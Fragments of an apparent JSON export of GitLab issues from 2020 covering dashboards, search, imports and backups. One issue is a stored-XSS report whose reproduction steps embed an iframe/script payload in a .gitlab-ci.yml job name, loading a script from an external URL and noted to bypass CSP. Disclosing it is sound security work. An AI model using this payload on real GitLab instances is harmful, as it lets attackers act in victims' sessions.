[{"id":69477417,"iid":233810,"project_id":278964,"title":"API support for updating severity counts as filters are applied","description":"### Problem to solve\n\nThe current Security Dashboards display tiles for each severity level with a count of the number of vulnerabilities with that severity. However, the count is both static (does not update as you filter the vulnerability list) and does not count vulnerabilities with a `Dismissed` or `Resolved` state. This is confusing as the counts at the top almost never match what you see in the vulnerability list. \n\n### Intended users\n\n* [Sam (Security Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sam-security-\n\n### Proposal\n\nThe counts in the severity \"tiles\" at the top should always match the number of vulnerabilities displayed of the same severity in the vulnerability list. When a filter (Status, Scanner, Severity, etc.) is applied, the counts should update along with the vulnerabilities displayed in the list.\n\n### Further details\n\nThis behavior should apply to the Project, Group, and Instance Security Dashboards\n\nThe ~frontend work is tracked in this separate issue https://gitlab.com/gitlab-org/gitlab/-/issues/231400\n\n### Documentation\n\nAny API specific doc updates necessary should be completed as part of this issue.\n\n### Implementation plan\n\n- [ ] ~backend Write resolver for `vulnerability_severities_count` field from `Types::ProjectType` that will take same  arguments as `Resolvers::VulnerabilitiesResolver` (consider extracting the list of arguments to separate module and include them in both `Resolvers::VulnerabilitiesResolver` and newly created `Resolvers::VulnerabilitiesCountResolver`),\n- [ ] ~backend Extend `Security::VulnerabilitiesFinder` to support optional counting vulnerabilities grouped by severity and use it in newly created `Resolvers::VulnerabilitiesCountResolver`,\n- [ ] ~backend Extend `Types::InstanceSecurityDashboardType`and `Types::GroupType` with new field `vulnerability_severities_count` that will use newly created `Resolvers::VulnerabilitiesCountResolver`","state":"closed","created_at":"2020-08-05T19:15:17.164Z","updated_at":"2020-10-08T05:02:23.512Z","closed_at":"2020-09-04T06:43:18.497Z","closed_by":{"id":5535431,"username":"mparuszewski","name":"Alan

Create a group, let's call it foo\n2. Create a subgroup within foo, let's call it bar\n3. Create a project within bar, let's call it boo\n\nThe structure should look as follows:\n\n    foo (group)\n    |- bar (subgroup)\n       |- boo (project)\n\n4. Create an epic in foo called \"Test Epic\"\n5. Create two issues in boo called \"Test Issue 1\" and \"Test Issue 2\"\n6. Add Test Issue 1 to Test Epic\n7. Go to List or Boards view for the issues in boo\n8. Attempt to filter by Test Epic and you see the box does not show Test Epic\n\n### Example Project\n\n### What is the current *bug* behavior?\n\nThe filter options for epics do not populate epics created at higher group levels.\n\n### What is the expected *correct* behavior?\n\nThe filter options for epics do populate epics created at higher group levels.\n\n### Relevant logs and/or screenshots\n\n![opera_2020-08-05_10-30-50](/uploads/a11264380eaadc1a9aa70918f16a96bd/opera_2020-08-05_10-30-50.png)\n\n### Output of checks\n\nThis bug occurs on our self-hosted instance of GitLab.

It should also not time-out every time it loads (ideally). \n\n### Further details\n\nThe decision was made as part of the Standalone Vulnerabilities MVC to leave this report back by the original \"findings\" data. While it was acknowledged at the time that this could be confusing for customers, due to time constraints we're choosing to address this data source in future iteration.\n\n### Proposal\n\nA new GraphQL endpoint was created as part of https://gitlab.com/gitlab-org/gitlab/-/issues/213623: `ee/app/assets/javascripts/security_dashboard/graphql/get_instance_security_dashboard_projects.query.graphql`\n\nThis issue reflects the ~frontend work required to hook that endpoint up to the reports on the Instance and Group level dashboards. \n\n### Implementation plan \n\nTaken from https://gitlab.com/gitlab-org/gitlab/-/issues/213623#note_390130264\n- [x] Replace the old query and use the one provided [here](https://gitlab.com/gitlab-org/gitlab/-/issues/213623#note_388766468). Here is the query file that is responsible for the query: `ee/app/assets/javascripts/security_dashboard/graphql/get_instance_security_dashboard_projects.query.graphql`. We'll need to remove the `...VulnerabilitySeveritiesCount` part.\n- [x] Right now the severities are attached to the project object and inside `ee/app/assets/javascripts/security_dashboard/components/first_class_vulnerability_severities.vue` we have a few methods responsible for mapping the data appropriately. The following is the biggest chunk which normalises the data.\n\n\n```\n    findProjectsForGroup(group) {\n      if (group.type === severityGroupTypes.A) {\n        return this.projects.filter(\n          project =\u003e\n            Object.values(project.vulnerabilitySeveritiesCount || {})\n              .filter(i =\u003e isNumber(i))\n              .reduce(sum, 0) === 0,\n        );\n      }\n\n      return this.projects\n        .filter(project =\u003e\n          group.severityLevels.some(level =\u003e project.vulnerabilitySeveritiesCount?.[level] \u003e 0),\n        )\n        .map(project =\u003e ({\n          ...project,\n          mostSevereVulnerability: this.findMostSevereVulnerabilityForGroup(project, group),\n        }));\n    },\n```\n\nThis bit needs to be removed.\n\n1. Finally we need to fetch the vulnerabilities at instance and group level dashboards and pass it down to the `first_class_vulnerability_severities.vue` component. This needs a bit refactoring.","state":"closed","created_at":"2020-08-04T19:39:29.873Z","updated_at":"2021-10-28T14:09:41.564Z","closed_at":"2020-09-10T08:45:26.238Z","closed_by":{"id":5535246,"username":"svedova","name":"Savas Vedova","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5535246/avatar.png","web_url":"https://gitlab.com/svedova"},"labels":["Category:Vulnerability Management","devops::secure","frontend","group::threat insights","section::sec","security dashboard","type::maintenance","workflow::verification"],"milestone":{"id":1233752,"iid":50,"group_id":9970,"title":"13.3","description":"https://about.gitlab.com/releases/2020/08/22/gitlab-13-3-released/","state":"closed","created_at":"2020-04-09T17:39:21.090Z","updated_at":"2022-04-13T14:50:18.976Z","due_date":"2020-08-17","start_date":"2020-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/50"},"assignees":[{"id":5535246,"username":"svedova","name":"Savas Vedova","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5535246/avatar.png","web_url":"https://gitlab.com/svedova"}],"author":{"id":4906978,"username":"lkerr","name":"Lindsay Kerr","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4906978/avatar.png","web_url":"https://gitlab.com/lkerr"},"type":"ISSUE","assignee":{"id":5535246,"username":"svedova","name":"Savas Vedova","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5535246/avatar.png","web_url":"https://gitlab.com/svedova"},"user_notes_count":5,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/233536","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":2,"completed_count":2},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"2 of 2 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/233536","notes":"https://gitlab.com/api/v4/projects/278964/issues/233536/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/233536/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#233536","relative":"#233536","full":"gitlab-org/gitlab#233536"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":69420140,"iid":233521,"project_id":278964,"title":"Create expandable container component","description":"This issue will track the creation of an expandable container component that will house the analysers section of the SAST Configuration UI.\n\nThis component _might_ already exist in our codebase somewhere as a reusable Vue component; if so, we should find and use that, meaning we can just close this issue.\n\nIf it _doesn't_ exist, let's create it:\n- Probably place in `ee/app/assets/javascripts/security_configuration/sast/components`\n    - We _could_ make this generic and put it in `vue_shared`, but really that's deprecated in favour of GitLab UI.

To start, this test case issuable would need the following additional `widgets` built on top of the default base type (see [technical example](https://gitlab.com/gitlab-org/gitlab/-/issues/222954)):\n\n**Primary Container**\n\n* description\n\n**Primary Tabbed**\n\n* none\n\n**Secondary Container (right sidebar)**\n\n* labels\n\nOver time, we will be able to add additional custom widgets for test cases such as:\n\n* Environment\n* Pass / Fail status (per environment)\n* discussions\n\nIn order to commence testing, test case issues can be duplicated as test runs. This will allow them to be linked to the parent tase case, and allow pass / fail information to be passed back to the parent test case for display.\n\n## GitLab Tier\n\nReferencing the guidance on the [Buyer Based Tiering Clarification](https://about.gitlab.com/handbook/ceo/pricing/#buyer-based-tiering-clarification), it would appear that the Quality Management would fall into the  ~\"GitLab Ultimate\" tier.\n\n## Tasks\n\nSee [discussion](https://gitlab.com/gitlab-org/gitlab/-/issues/233479#note_398220133)\n\n##### 1.

Fortunately it currently does not exist in gitlab.com. It seems that gitlab.com [disables](https://gitlab.com/gitlab-org/gitlab/-/issues/6144#note_232311971) the dependencies validation. However this feature is enable by default in self-managed installation.\n\n### Steps to reproduce\n\nThe following steps should to be reproduced in a self-managed installation of gitlab\n\n1. Create an empty project  \n2. Go to \"Settings/CI/CD/Runners\" to setup a runner for this project  \n3. Create new file `.gitlab-ci.yml` for this project using the following content:\n\n```yaml  \ntest\u003ciframe srcdoc='\u003cscript src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js\u003e\u003c/script\u003e'\u003e\u003c/iframe\u003e:  \n  stage: build  \n  script:   \n    - date \u003e index.html  \n  artifacts:  \n    paths:   \n      - index.html  \n    expire_in: 1 second\n\njob-test:  \n  stage: test  \n  script: echo \"hi\"  \n  dependencies: [\"test\u003ciframe srcdoc='\u003cscript src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js\u003e\u003c/script\u003e'\u003e\u003c/iframe\u003e\"]  \n```\n\n4. Wait for the jobs terminated, go to the detail of `job-test`  \n5. You should see an alert that contains the current url\n\n### Impact\n\nStored-XSS allow attackers to perform arbitrary actions on behalf of victims at client side.   \nFurthermore, by using `\u003ciframe\u003e`  (detailed in #831962), the Stored-XSS can be fired in gitlab.com despite its CSP.\n\n### What is the current *bug* behavior?\n\nThe `failure_message` has been considered as

first four sections: \"Problem to solve\", \"Intended users\", \"User experience goal\", and \"Proposal\", are strongly recommended, while the rest of the sections can be filled out during the problem validation or breakdown phase. However, keep in mind that providing complete and relevant information early helps our product team validate the problem and start working on a solution. --\u003e\n\n### Problem to solve\n\n\u003c!-- What problem do we solve? Try to define the who/what/why of the opportunity as a user story. For example, \"As a (who), I want (what), so I can (why/value).\" --\u003e\n\nWhen dumping repositories for backup, gitlab-backup includes project and wiki repositories but not design.\n\n### Intended users\n\n* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)\n* [Sidney (Systems Administrator)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sidney-systems-administrator)\n\n### User experience goal\n\n\u003c!-- What is the single user experience workflow this problem addresses? \nFor example, \"The user should be able to use the UI/API/.gitlab-ci.yml with GitLab to \u003cperform a specific task\u003e\"\nhttps://about.gitlab.com/handbook/engineering/ux/ux-research-training/user-story-mapping/ --\u003e \n\n\n### Proposal\n\nInclude design repositories in backup dump.\n\n### Further details\n\n\u003c!-- Include use cases, benefits, goals, or any other details that will help us understand the problem better. --\u003e\n\n### Permissions and Security\n\n\u003c!-- What permissions are required to perform the described actions? Are they consistent with the existing permissions as documented for users, groups, and projects as appropriate? Is the proposed behavior consistent between the UI, API, and other access methods (e.g. email replies)?\nConsider adding checkboxes and expectations of users with certain levels of membership https://docs.gitlab.com/ee/user/permissions.html\n* [ ] Add expected impact to members with no access (0)\n* [ ] Add expected impact to Guest (10) members\n* [ ] Add expected impact to Reporter (20) members\n* [ ] Add expected impact to Developer (30) members \n* [ ] Add expected impact to Maintainer (40) members\n* [ ] Add expected impact to Owner (50) members --\u003e\n\n### Documentation\n\n\u003c!-- See the Feature Change Documentation Workflow https://docs.gitlab.com/ee/development/documentation/workflow.html#for-a-product-change\n\n* Add all known Documentation Requirements in this section.

See https://docs.gitlab.com/ee/user/permissions.html --\u003e\n\n### Availability \u0026 Testing\n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e\n\n### What does success look like, and how can we measure that?\n\n\u003c!-- Define both the success metrics and acceptance criteria. Note that success metrics indicate the desired business outcomes, while acceptance criteria indicate when the solution is working correctly. If there is no way to measure success, link to an issue that will implement a way to measure this. --\u003e\n\n### What is the type of buyer?\n\n\u003c!-- What is the buyer persona for this feature? See https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/buyer-persona/\nIn which enterprise tier should this feature go?

Project/Group/Instance-level endpoint and the package is NOT found, forward the request to pypi.org and, if possible, download the package. \n\n### Further details\n\nThis feature is part of our effort to deliver a virtual registry for the PyPI repository that will proxy and cache requests for packages outside of

form","description":"The following discussion from !38315 should be addressed:\n\n- [ ] @philipcunningham started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/38315#note_388590648):  (+4 comments)\n\n    \u003e @pgascouvaillancourt this is taking shape :bow: \n    \u003e \n    \u003e i've added some comments and suggestions above but i think there might be a slightly more systemic issue in that all of our graphql endpoints for `dast_site_profiles` and `dast_on_demand_scans` deal with global ids (e.g. `\"gid://gitlab/DastSiteProfile/3\"`) whereas the code you're using here relies on primary keys of the db tables.\n    \u003e \n    \u003e you could extract the primary key from global id in the graphql response but i don't know if this is a common pattern on the ~frontend or not. that said, i wonder if it might make sense to add that graphql query to the ~backend for pulling sooner rather than later to ensure that we can fit everything together. wdyt?\n\n---\n\n## Problem to solve\n\nOnce the [DAST site profiles library](https://gitlab.com/gitlab-org/gitlab/-/issues/229514) and the [DAST site profile form](https://gitlab.com/gitlab-org/gitlab/-/issues/227244) are completed, the **Edit** links in the former should link to the latter.\n\nPrior art: [GroupEntity](https://gitlab.com/gitlab-org/gitlab/-/blob/dc6fa0462cada162d6027b1a50fc0baed11d851a/app/serializers/group_entity.rb#L27-29)\n\n## Implementation plan\n\n~backend \n\n- [x] Extend the [`DastSiteProfiles` GraphQL query](https://gitlab.com/gitlab-org/gitlab/-/issues/231270) to expose the edit path which can be obtained with the `edit_project_dast_site_profile_path(project, dast_site_profile)` helper.\n\n```patch\n query DastSiteProfiles($fullPath: ID!, $after: Int, $before: Int, $first: Int, $last: Int) {\n   project(fullPath: $fullPath) {\n     DastSiteProfiles(after: $after, before: $before, first: $first, last: $last) {\n       pageInfo {\n         hasNextPage\n         hasPreviousPage\n       }\n

complete\n         }\n       }\n     }\n   }\n }\n```\n\n~frontend \n\n- [x] In the DAST site profiles list, retrieve the `editPath` and use it for as the href for **Edit** links.\n\n/cc

(This was [reported in another issue](https://gitlab.com/gitlab-org/gitlab/-/issues/212718#note_387829235).)\n\n### Replication instructions\n\n1. Go to a board in gitlab-org ([example](https://gitlab.com/groups/gitlab-org/-/boards/1235826?\u0026label_name[]=devops%3A%3Aplan\u0026label_name[]=group%3A%3Aproject%20management))\n1.

See that the gitlab-org/gitlab project does not appear.\n\nNote: You can type \"end-to-end\" as a workaround.  That will cause gitlab-org/gitlab to appear as the 3rd suggestion.\n\n### Proposal\n\nOn the board's \"Add issue\" feature, the \"Project\" selector should use [similarity sorting](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/37300).\n\n### Relevant notes\n\n[From @ahegyi](https://gitlab.com/gitlab-org/gitlab/-/issues/212718#note_389892393):\n\n\u003e As far as I can see it's using the group projects API endpoint which already has an option for similarity search. ...

In [Elasticsearch simple query string syntax](https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-simple-query-string-query.html) this is mapped automatically to [`analyze \u0026 storage \u0026 used \u0026 elasticsearch`](https://gitlab.com/search?utf8=%E2%9C%93\u0026snippets=false\u0026scope=issues\u0026repository_ref=\u0026search=analyze+%26+storage+%26+used+%26+elasticsearch\u0026group_id=9970\u0026project_id=278964z).\n\nThis is useful when you are thinking of search like a filter. But when you're trying to discover an issue and you maybe have gotten one of the keywords wrong (eg. it was meant to be \"analysis\" instead of \"analyze\") then you won't find the issue at all and without knowing which keyword is wrong you have nowhere to go.\n\n## Solution\n\nIf you think about search as a way to discover and not necessarily like a filter then maybe it is more valuable to use \"OR\" as the default operator. In the above example you may want the default to be [`analyze | storage | used | elasticsearch`](https://gitlab.com/search?utf8=%E2%9C%93\u0026snippets=false\u0026scope=issues\u0026repository_ref=\u0026search=analyze+%7C+storage+%7C+used+%7C+elasticsearch\u0026group_id=9970\u0026project_id=278964). In this case it reveals the actual issue I was searching for at the top which actually contained the word \"analysis\" (which I confused for \"analyze\").\n\nIn that case even if one of your words is wrong you will still get some results back and if the ranking is good you will likely see the result you were looking for at the top of the list assuming some of the keywords are relevant.\n\nThis is an easy settings change in our Elasticsearch query to change [the default operator](https://gitlab.com/gitlab-org/gitlab/-/blob/1db40d61742344f1e2f22d1d5d61662679e8d3aa/ee/lib/elastic/latest/application_class_proxy.rb#L54). \n\nSwitching to `OR` by default optimizes for discovery while possibly leading to frustration about too many irrelevant results. A user can always explicitly specify the `\u0026`, however, if they do want to filter down very deliberately. It's also easy for the user to see after their first search that they need to be more specific, if they get back too many results. We could even add a hint to use `\u0026` syntax if we return (for example) \u003e 100 results.\n\nIt's also easy in our code to change the default depending on the type of resource you are searching for. It may make sense for `AND` to be the default for code (computer readable text =\u003e more structured) search but `OR` should be the default for issues, comments, merge requests (human readable text =\u003e less structured).\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e\n*This page may contain information related to upcoming products, features and functionality.\nIt is important to note that the information presented is for informational purposes only, so please do not rely on the information for purchasing or planning purposes.\nJust like with all projects, the items mentioned on the page are subject to change or delay, and the development, release, and timing of any products, features, or functionality remain at the sole discretion of GitLab Inc.*\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e","state":"closed","created_at":"2020-08-03T03:11:44.353Z","updated_at":"2022-05-30T17:35:48.247Z","closed_at":"2020-09-16T07:27:39.884Z","closed_by":{"id":5054237,"username":"dgruzd","name":"Dmitry Gruzd","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5054237/avatar.png","web_url":"https://gitlab.com/dgruzd"},"labels":["Category:Global Search","Deliverable","customer","devops::data_stores","direction","group::global search","section::enablement","type::feature"],"milestone":{"id":1233753,"iid":51,"group_id":9970,"title":"13.4","description":"https://about.gitlab.com/releases/2020/09/22/gitlab-13-4-released/","state":"closed","created_at":"2020-04-09T17:39:21.662Z","updated_at":"2022-04-13T14:50:33.769Z","due_date":"2020-09-17","start_date":"2020-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/51"},"assignees":[{"id":5054237,"username":"dgruzd","name":"Dmitry Gruzd","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5054237/avatar.png","web_url":"https://gitlab.com/dgruzd"}],"author":{"id":120073,"username":"DylanGriffith","name":"Dylan Griffith","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/120073/avatar.png","web_url":"https://gitlab.com/DylanGriffith"},"type":"ISSUE","assignee":{"id":5054237,"username":"dgruzd","name":"Dmitry Gruzd","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5054237/avatar.png","web_url":"https://gitlab.com/dgruzd"},"user_notes_count":22,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/233350","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/233350","notes":"https://gitlab.com/api/v4/projects/278964/issues/233350/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/233350/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#233350","relative":"#233350","full":"gitlab-org/gitlab#233350"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":3729,"epic":{"id":73490,"iid":3729,"title":"Advanced Search Ranking","url":"/groups/gitlab-org/-/epics/3729","group_id":9970,"human_readable_end_date":"Apr 14, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":69345624,"iid":233349,"project_id":278964,"title":"GraphQL Vulnerabilities filter by activity","description":"In order to support #230381, the current `vulnerabilities` GraphQL query needs to [support filtering by `issueLink.state`](https://gitlab.com/gitlab-org/gitlab/-/issues/230381#note_387915708).\n\n\n## Implementation Plan\n\n- [x] extend `Resolvers::VulnerabilitiesResolver` to support 2 new arguments:\n    -

search results triggering significant database queries","description":"## Problem to Solve \n\nOccasionally a result page can load very slowly. One reason this was happening is that markdown rendered as part of the result page can cause for hundreds of additional queries to load the page. \n\nAfter optimizing the Markdown rendering and removing those extra queries we have cut the page load time in half.\n\n## Example\n\nIn the following search https://gitlab.com/search?search=auto+devops+mobile\u0026group_id=9970\u0026project_id=278964\u0026scope=issues you can see that there are a total of `299` PG queries. The total time for Postgres is larger than Elasticsearch.\n\n![Screen_Shot_2020-08-03_at_11.29.39_am](https://gitlab.com/gitlab-org/gitlab/uploads/8e76d97a0420ba35f7d4727d32593eaa/Screen_Shot_2020-08-03_at_11.29.39_am.png)\n\nIf you look at the queries you can see that many of them are done in the markdown rendering. If we want to render markdown the database queries are necessary for things like `@` mentions and issue/MR links.\n\n## Solution\n\nI can imagine a few possible options (in order least to most difficult):\n\n1. Simply remove the markdown rendering if we're not sure it's valuable\n2. Investigate the markdown rendering and confirm we're only rendering the markdown for the first part of the description. If we are rendering the entire description then truncating it in the view it's possible we're loading way more than necessary.\n3. Consider skipping parts of the markdown rendering that require DB queries. If we only care about the HTML formatting parts then we don't need to do the DB queries to lookup `@` mentions or issue/MR references. I'm not sure if this is easy to do with our markdown renderer.\n\n## Further details\n\nIt seems almost all the parser DB queries are generated in:\n\n```\n\"lib/banzai/reference_parser/base_parser.rb:178:in `collection_objects_for_ids'\",\n  \"lib/banzai/reference_parser/base_parser.rb:140:in `grouped_objects_for_nodes'\",\n

It is misreported as applying to **All environments**.\n\n### Steps to reproduce\n\nThe database state is displayed in a table that results from the following query:\n\n```sql\nSELECT\n  f.name AS flag_name,\n  s.name AS strategy_name,\n  c.environment_scope\nFROM operations_feature_flags AS f JOIN operations_strategies AS s ON f.id = s.feature_flag_id\nLEFT JOIN operations_scopes AS c ON s.id = c.strategy_id\nWHERE f.project_id = 30 and f.name = 'clouds_v2';\n```\n\n1.

working up until GitLab v13.1.2, but since v13.2.0 fails so long the BB project name is different from project key.\n\nThis behaviour can be seen in BitLab.com as well as in SM \u003e= v13.2.0.\n\n### Steps to reproduce\n\ncreate project -\u003e import project -\u003e Bitbucket Server -\u003e import\n\n![BBS.import.fail](/uploads/6d7c383bb3565c6a17ca8e7c9f377c9a/BBS.import.fail.png)\n\n\n### Example Project\n\nN/A\n\n### What is the current *bug* behavior?\n\nBitBucket Server Importer fails while importing BB repository\n\n### What is the expected *correct* behavior?\n\nBB Server Importer should succeed with the import.\n\n### Relevant logs and/or screenshots\n\nGitLab is incorrectly calling the BB API using the project name (here `my project FOSS AI`), where as project key (here `AI`) should have been used.\n\n```\n==\u003e /var/log/gitlab/gitlab-rails/production.log \u003c==\n  \nURI::InvalidURIError (bad URI(is not URI?):

[Previous] and/or [Next] buttons.\n\nThe filter field is operational and allows to search for repositories which are not on the first page.\n\nThis functionality stopped working between v13.1.2 and v13.2.0.\n\n### Steps to reproduce\n\n* Spin up a BitBucket (BB) server.\n* Generate 25+ repositories in that BB instance.\n* In GitLab WebUI, create new project -\u003e import project -\u003e BitBucket Server (import tool) -\u003e connect to the BB instance\n* In the UI it is impossible to go to the next page of repositories.\n\n---\nShell script to generate 20 BitBucket projects, each containing 2 repositories.\n\n```\n#!/bint/bash\n\nbb_user=\u003cBITBUCKET_USER\u003e\nbb_pswd=\u003cBB_PASSWORD/ACCESS_TOKEN\u003e\nbb_host=\u003cBB_HOSTNAME\u003e #e.g.

$bb_host/rest/api/latest/projects -d '{\"key\": \"'$project'\", \"name\": \"my project '$project'\", \"description\": \"API generated project '$project'\"}' \n  for slug in `cat /dev/urandom | tr -dc 'a-z' | fold -w 10 | head -n $bb_repos_count`; do \n    echo -e \" * creating repo $slug under the project $project \\n\"\n    curl -s -u $bb_user:$bb_pswd  -X POST -H \"Content-Type: application/json\" -d '{\"name\": \"'$slug'\", \"scmID\": \"git\", \"forkable\":false}' $bb_host/rest/api/latest/projects/$project/repos\n  done\ndone\n```\n\n\n### Example Project\n\nImporting projects from BitBucket server into GitLab.com shows this faulty behaviour as well.\n\n### What is the current *bug* behavior?\n\nNo more than one page of BitBucket repositories is shown in the GitLab WebUI.\n\n### What is the expected *correct* behavior?\n\nThe Pagination should be working and in case there are more pages of repositories available in the source BitBucket instance.\n\n### Relevant logs and/or screenshots\n\nThis behaviour is observed in gitlab.com as well in self-managed instances (v13.2.0 as well as v13.2.1)\n\n![13.2.0.gl](/uploads/1c687ce3b555c32954109cbd830d917d/13.2.0.gl.png)\n\n![13.2.0](/uploads/c77d5ea1f07294807b573b4aa5b18905/13.2.0.png)\n\nThis has to be a recently introduced bug as the pagination IS working on an SM instance v13.1.2.\n\n![13.1.2.gl](/uploads/478db52028971e669f188d46bdd1509d/13.1.2.gl.png)\n\n![13.1.2](/uploads/86bab7fc6bbe8f95d2e53af642a090e2/13.1.2.png)\n\n###
